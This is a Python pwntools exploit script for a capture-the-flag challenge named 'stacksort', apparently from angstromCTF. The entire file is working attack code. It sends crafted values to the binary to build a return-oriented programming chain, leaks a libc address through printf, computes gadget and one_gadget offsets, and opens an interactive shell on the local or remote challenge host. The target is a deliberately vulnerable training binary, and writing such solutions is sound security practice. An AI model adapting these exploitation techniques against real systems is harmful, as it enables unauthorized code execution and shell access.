#!/usr/bin/env python3
# Local Ubuntu 22.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./stacksort"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "challs.actf.co"
  PORT = 31500
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6", checksec=False)
else:
  s = process([BINARY])
  #s = process([BINARY], env={'LD_PRELOAD': './libc.so.6'})
  libc = elf.libc

ret_addr    = 0x40101a 
printf_addr = 0x401050
start_addr  = 0x4010d0
main_addr   = elf.sym.main

cnt = 206

for i in range(cnt):
  s.sendlineafter(b": ", str(ret_addr).encode())

# libc leak
s.sendlineafter(b": ", str(ret_addr).encode())
s.sendlineafter(b": ", str(printf_addr).encode())

for i in range(256 - cnt - 2):
  s.sendlineafter(b": ", str(start_addr).encode())

libc_leak = u64(s.recvn(6) + b"\x00\x00")
libc_base = libc_leak - 0x21b150
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

ret_addr        = libc_base + 0x3c97f 
pop_rcx_ret     = libc_base + 0x3d1ee  #: pop rcx; ret;
pop_rbp_jmp_rcx = libc_base + 0x15d299 #: pop rbp; jmp rcx;
one_gadget      = libc_base + 0xebc88
libc_writable   = libc_base + 0x21bb50

print("one_gadget  =", hex(one_gadget))

cnt2 = 200

# send ROP
for i in range(cnt2):
    s.sendafter(b": ", str(ret_addr).encode())

s.sendafter(b": ", str(pop_rcx_ret).encode())
s.sendafter(b": ", str(one_gadget).encode())
s.sendafter(b": ", str(pop_rbp_jmp_rcx).encode())
s.sendafter(b": ", str(libc_writable).encode())

for i in range(256 - cnt2 - 4):
    s.sendafter(b": ", str(libc_writable).encode())

s.interactive()
